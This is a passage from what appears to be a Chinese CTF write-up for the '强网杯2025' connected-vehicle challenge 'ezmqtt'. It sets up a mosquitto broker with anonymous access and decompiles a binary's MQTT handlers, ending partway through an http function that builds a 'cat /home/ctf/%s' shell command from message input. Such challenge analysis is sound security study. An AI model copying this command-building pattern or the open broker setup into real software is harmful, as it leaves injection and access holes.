+<p><a target="_blank" rel="noopener" href="https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/">https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/</a><br>其中 <code>MQTTClient_create</code>、<code>MQTTClient_setCallbacks</code>、<code>MQTTClient_connect</code>、<code>MQTTClient_subscribe</code> 这几个重要函数的文档可以看：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#a9a0518d9ca924d12c1329dbe3de5f2b6">https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#a9a0518d9ca924d12c1329dbe3de5f2b6</a><br><a target="_blank" rel="noopener" href="https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#aad27d07782991a4937ebf2f39a021f83">https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#aad27d07782991a4937ebf2f39a021f83</a><br><a target="_blank" rel="noopener" href="https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#aaa8ae61cd65c9dc0846df10122d7bd4e">https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#aaa8ae61cd65c9dc0846df10122d7bd4e</a><br><a target="_blank" rel="noopener" href="https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#a9c1c28258f0d5c6a44ff53a98618f5f3">https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#a9c1c28258f0d5c6a44ff53a98618f5f3</a></p>
+</blockquote>
+<p>也可以看 so 库静态分析的内容（只有函数签名和实现等内容）。</p>
+<p>整个 <code>main</code> 函数可以看作是建立 tcp 然后发消息那样。<br>首先调用 <code>create</code> 函数创建套接字，此处第 3 个参数 <code>clientId</code>，是 mqtt 中的客户端 id，用于唯一标识客户端连接与会话的重要字段，代表 <code>pwn</code> 以 <code>httpclient</code> 为客户端 id。<br>然后 <code>setCallbacks</code> 设置 mqtt 回调函数。<br>接下来 <code>connect</code> 尝试连接到 mqtt broker。<br><code>subscribe</code> 订阅指定主题的消息，此处是 <code>HTTP</code> 这个主题，并指定 <code>qos</code> 为 1，表示消息至少传送一次。<br>最后循环调用 <code>msgsend</code> 函数，该函数里层还有内容。</p>
+<h2 id="查看-msgsend"><a href="#查看-msgsend" class="headerlink" title="查看 msgsend"></a>查看 <code>msgsend</code></h2><p>ida 刚点进这个函数的时候可能没有自动识别结构体。没关系，注意到 <code>MQTTClient_publishMessage</code> 这个函数的调用，看签名：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">MQTTClient_publishMessage</span><span class="token punctuation">(</span>
+        MQTTClient handle<span class="token punctuation">,</span>
+        <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>topicName<span class="token punctuation">,</span>
+        MQTTClient_message <span class="token operator">*</span>message<span class="token punctuation">,</span>
+        MQTTClient_deliveryToken <span class="token operator">*</span>deliveryToken<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注意到向这个函数传入的 <code>pubmsg</code>，本质是一个 <code>MQTTClient_message</code> 结构体，按 <code>Y</code> 键修改其类型即可。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">msgsend</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-114h]</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">264</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-110h] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 cookie<span class="token punctuation">;</span> <span class="token comment">// [rsp+128h] [rbp-8h]</span>
+
+  cookie <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">snprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">,</span> <span class="token string">"&#123;\"clientid\":\"%s\", \"message\":\"%s\"&#125;"</span><span class="token punctuation">,</span> <span class="token string">"httpclient"</span><span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  pubmsg<span class="token punctuation">.</span>payload <span class="token operator">=</span> s<span class="token punctuation">;</span>
+  pubmsg<span class="token punctuation">.</span>payloadlen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  pubmsg<span class="token punctuation">.</span>qos <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  pubmsg<span class="token punctuation">.</span>retained <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token function">LODWORD</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  v2 <span class="token operator">=</span> <span class="token function">MQTTClient_publishMessage</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span> <span class="token string">"HTTP"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pubmsg<span class="token punctuation">,</span> <span class="token operator">&amp;</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Failed to publish message, return code %d\n"</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> v2<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>简单来说，就是设置了一些要发送的内容和参数，然后交由 mqtt 库进行发送。</p>
+<p>提一嘴，<code>MQTTClient_publishMessage</code> 的文档见：<br><a target="_blank" rel="noopener" href="https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#ace320b8a92c7087d9dd5cf242d50389d">https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#ace320b8a92c7087d9dd5cf242d50389d</a></p>
+<p>此处可以进行测试，看是否能收到该 <code>pwn</code> 发送的信息。<br>但是在此之前，需要先安装一个 mqtt broker 才能够接收。</p>
+<h2 id="mosquitto-broker-配置"><a href="#mosquitto-broker-配置" class="headerlink" title="mosquitto broker 配置"></a>mosquitto broker 配置</h2><p>此处选用 mosquitto 作为 mqtt 服务器。官网：<br><a target="_blank" rel="noopener" href="https://mosquitto.org/">https://mosquitto.org/</a><br>安装方式（我使用的系统是 mint linux）：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> mosquitto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><a target="_blank" rel="noopener" href="https://mosquitto.org/download/">https://mosquitto.org/download/</a></p>
+<p>安装完成之后会自动启动为服务。我没有这方面的需求，而且启动为服务之后还要反复 <code>systemctl</code> 重启，所以直接关掉，后面手动启动。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl stop mosquitto
+<span class="token function">sudo</span> systemctl disable mosquitto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>因为其默认配置是为了服务而设置的，所以需要改一些东西。<br>并且我使用的是 vmware，从虚拟机反代出来数据似乎比较麻烦，而 <code>mosquitto -p 9999</code> 只允许 <code>localhost</code> 访问，所以此处不得不修改配置。<br>此处我的配置如下（配置文件在 <code>/etc/mosquitto/mosquitto.conf</code>）：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Place your local configuration in /etc/mosquitto/conf.d/</span>
+<span class="token comment">#</span>
+<span class="token comment"># A full description of the configuration file is at</span>
+<span class="token comment"># /usr/share/doc/mosquitto/examples/mosquitto.conf.example</span>
+
+<span class="token comment"># pid_file /run/mosquitto/mosquitto.pid</span>
+
+<span class="token comment">#true</span>
+persistence <span class="token boolean">false</span>
+persistence_location /var/lib/mosquitto/
+
+<span class="token comment"># log_dest file /var/log/mosquitto/mosquitto.log</span>
+
+include_dir /etc/mosquitto/conf.d
+
+<span class="token comment"># >..</span>
+listener <span class="token number">9999</span>
+<span class="token comment"># 必须允许匿名，否则 pwn 无法连接</span>
+allow_anonymous <span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>随后 <code>mosquitto -c ./mosquitto.conf</code> 即可启动。</p>
+<pre class="line-numbers language-none"><code class="language-none">1789560763: mosquitto version 2.0.11 starting
+1789560763: Config loaded from .&#x2F;mosquitto.conf.
+1789560763: Opening ipv4 listen socket on port 9999.
+1789560763: Opening ipv6 listen socket on port 9999.
+1789560763: mosquitto version 2.0.11 running<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>启动 <code>./pwn</code>，会发现已经有数据发送。</p>
+<pre class="line-numbers language-none"><code class="language-none">Using server at tcp:&#x2F;&#x2F;localhost:9999
+waiting for message
+
+Message with token value 2 delivery confirmed
+waiting for message
+
+Message with token value 3 delivery confirmed
+waiting for message
+
+Message with token value 4 delivery confirmed
+waiting for message
+
+Message with token value 5 delivery confirmed
+waiting for message<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>此时在主机启动 mqtt 客户端，我使用的是 mqttx。<br><img src="/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/4.png"></p>
+<p>连接成功之后就可以添加订阅了。还记得刚才的 <code>HTTP</code> 主题吗，直接添加即可。<br><img src="/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/5.png"></p>
+<p>添加完成之后就会收到 <code>pwn</code> 发来的消息了，与 <code>msgsend</code> 函数中定义的一样。<br><img src="/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/6.png"></p>
+<h2 id="msgarrvd-函数"><a href="#msgarrvd-函数" class="headerlink" title="msgarrvd 函数"></a><code>msgarrvd</code> 函数</h2><p>既然能够接收数据了，那应该如何接收数据呢？漏洞又在哪呢？<br>还记得之前的：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">rc <span class="token operator">=</span> <span class="token function">MQTTClient_setCallbacks</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> connlost<span class="token punctuation">,</span> msgarrvd<span class="token punctuation">,</span> delivered<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>此处的 <code>msgarrvd</code> 就是接收数据的逻辑。为什么？看文档：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#aad27d07782991a4937ebf2f39a021f83">https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#aad27d07782991a4937ebf2f39a021f83</a><br><a target="_blank" rel="noopener" href="https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#aa42130dd069e7e949bcab37b6dce64a5">https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#aa42130dd069e7e949bcab37b6dce64a5</a></p>
+</blockquote>
+<p>接收回调函数的签名如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">int</span> <span class="token function">MQTTClient_messageArrived</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>context<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>topicName<span class="token punctuation">,</span> <span class="token keyword">int</span> topicLen<span class="token punctuation">,</span> MQTTClient_message <span class="token operator">*</span>message<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li><code>context</code> 即前面创建的 “套接字”；</li>
+<li><code>topicName</code> 即主题名；</li>
+<li><code>topicLen</code> （？？？）；</li>
+<li><code>message</code> 接收到的消息；</li>
+</ul>
+<p>整理一下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">msgarrvd</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>context<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>topicName<span class="token punctuation">,</span> <span class="token keyword">int</span> topicLen<span class="token punctuation">,</span> MQTTClient_message <span class="token operator">*</span>message<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  MQTTClient_message MQTTClient_message_<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-80h] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 cookie<span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp-8h]</span>
+
+  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>MQTTClient_message_<span class="token punctuation">.</span>qos <span class="token operator">=</span> context<span class="token punctuation">;</span>
+  MQTTClient_message_<span class="token punctuation">.</span>payload <span class="token operator">=</span> topicName<span class="token punctuation">;</span>
+  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>MQTTClient_message_<span class="token punctuation">.</span>payloadlen <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> topicLen<span class="token punctuation">;</span>
+  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>MQTTClient_message_<span class="token punctuation">.</span>struct_id <span class="token operator">=</span> message<span class="token punctuation">;</span>
+  cookie <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>MQTTClient_message_<span class="token punctuation">.</span>properties<span class="token punctuation">.</span>count <span class="token operator">=</span> message<span class="token operator">-></span>payload<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">__isoc99_sscanf</span><span class="token punctuation">(</span>
+                       <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>MQTTClient_message_<span class="token punctuation">.</span>properties<span class="token punctuation">.</span>count<span class="token punctuation">,</span>
+                       <span class="token string">"&#123;\"clientid\":\"%63[^\"]\","</span><span class="token punctuation">,</span>
+                       <span class="token operator">&amp;</span>MQTTClient_message_<span class="token punctuation">.</span>properties<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span>
+    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>MQTTClient_message_<span class="token punctuation">.</span>properties<span class="token punctuation">.</span>length<span class="token punctuation">,</span> <span class="token string">"httpclient"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>                                             <span class="token comment">// 如果接收到的信息包含了：</span>
+                                                <span class="token comment">// &#123;"clientid":"xxx"</span>
+                                                <span class="token comment">// 并且 xxx = "httpclient"，</span>
+                                                <span class="token comment">// 说明是自己发送的消息，就忽略。</span>
+                                                <span class="token comment">// 此处表明，既是发布者 publisher，也是订阅者 subscriber</span>
+    <span class="token function">MQTTClient_freeMessage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>MQTTClient_message_<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">MQTTClient_free</span><span class="token punctuation">(</span>MQTTClient_message_<span class="token punctuation">.</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>                                          <span class="token comment">// 否则就是其他客户端发送的消息</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">http</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>MQTTClient_message_<span class="token punctuation">.</span>properties<span class="token punctuation">.</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 处理返回</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Message arrived"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 在终端打印消息</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"     topic: %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>MQTTClient_message_<span class="token punctuation">.</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span>
+      <span class="token string">"   message: %.*s\n"</span><span class="token punctuation">,</span>
+      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>MQTTClient_message_<span class="token punctuation">.</span>struct_id <span class="token operator">+</span> <span class="token number">8LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>MQTTClient_message_<span class="token punctuation">.</span>struct_id <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">MQTTClient_freeMessage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>MQTTClient_message_<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 结束</span>
+    <span class="token function">MQTTClient_free</span><span class="token punctuation">(</span>MQTTClient_message_<span class="token punctuation">.</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>通过上面那段 <code>if</code> 逻辑，可以知道该程序既是发布方也是订阅方，接收 <code>HTTP</code> 主题下的消息。</p>
+<p>其中，<code>http</code> 方法是漏洞出现的位置。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">http</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>payload<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> flag<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-23Ch]</span>
+  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-238h]</span>
+  <span class="token keyword">int</span> buflen<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-234h]</span>
+  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-230h]</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-228h]</span>
+  <span class="token keyword">char</span> s1<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-220h] BYREF</span>
+  <span class="token keyword">char</span> target<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+70h] [rbp-1E0h] BYREF</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+B0h] [rbp-1A0h] BYREF</span>
+  <span class="token keyword">char</span> fbuf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+130h] [rbp-120h] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 cookie<span class="token punctuation">;</span> <span class="token comment">// [rsp+238h] [rbp-18h]</span>
+
+  cookie <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">memset</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">memset</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token function">memset</span><span class="token punctuation">(</span>fbuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fbuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">__isoc99_sscanf</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">"&#123;\"clientid\":\"%63[^\"]\""</span><span class="token punctuation">,</span> s1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"httpclient"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>                                   <span class="token comment">// 如果是自己的消息则忽略</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">__isoc99_sscanf</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">"GET /home/ctf/%63[^ \"\r\n/]"</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>                                             <span class="token comment">// GET /home/ctf/xxx。空格、双引号、\r、\n、/ 这5个字符以及后面的内容全部丢弃</span>
+    flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">__isoc99_sscanf</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">"GET %*[^/]/ctf/%63[^ \"\r\n/]"</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>                                             <span class="token comment">// GET abc/ctf/xxx。同上</span>
+    flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">__isoc99_sscanf</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">"GET %*s/ctf/\"%63[^\"]\""</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>                                             <span class="token comment">// ？</span>
+    flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strstr</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">"/ctf/"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token comment">// 兜底</span>
+  <span class="token punctuation">&#123;</span>
+    v6 <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">"/ctf/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>
+    <span class="token function">__isoc99_sscanf</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token string">"%63[^ \"\r\n/]"</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> flag <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> target<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'/'</span> <span class="token operator">||</span> target<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'.'</span> <span class="token punctuation">)</span>
+        target<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'_'</span><span class="token punctuation">;</span>                        <span class="token comment">// 。自动将 / 和 . 改为 _</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">snprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x80u</span><span class="token punctuation">,</span> <span class="token string">"cat /home/ctf/%s"</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 构造 shell 命令</span>
+    buflen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
